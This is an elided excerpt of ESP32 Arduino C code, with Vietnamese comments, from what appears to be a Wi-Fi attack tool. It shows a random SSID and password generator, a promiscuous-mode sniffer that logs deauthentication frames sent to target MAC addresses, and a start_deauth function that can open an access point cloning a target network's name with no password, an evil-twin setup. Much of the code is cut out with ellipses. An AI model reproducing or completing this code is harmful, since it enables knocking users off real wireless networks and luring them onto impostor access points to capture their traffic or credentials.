...
char* randString() {
  static char str[11]; // 10 ký tự + 1 ký tự null
  for (int i = 0; i < 10; i++) {
      str[i] = random(32, 126); // Ký tự in được trong bảng ASCII
  }
  str[10] = '\0'; // Kết thúc chuỗi
  return str;
}

char* tmpSSID = randString();
char* tmpPASS = randString();
...
IRAM_ATTR void sniffer(void *buf, wifi_promiscuous_pkt_type_t type) {
  ...
  char buffer[100];
  snprintf(buffer, sizeof(buffer), "Send %d Deauth to: %02X:%02X:%02X:%02X:%02X:%02X\n",
...
void start_deauth(int wifi_number, int attack_type, uint16_t reason, bool isClone) {
  ...
  if (deauth_type == DEAUTH_TYPE_SINGLE) {
    ...
    if (isClone) WiFi.softAP(WiFi.SSID(wifi_number), "", WiFi.channel(wifi_number));
    else         WiFi.softAP(tmpSSID, tmpPASS, WiFi.channel(wifi_number));
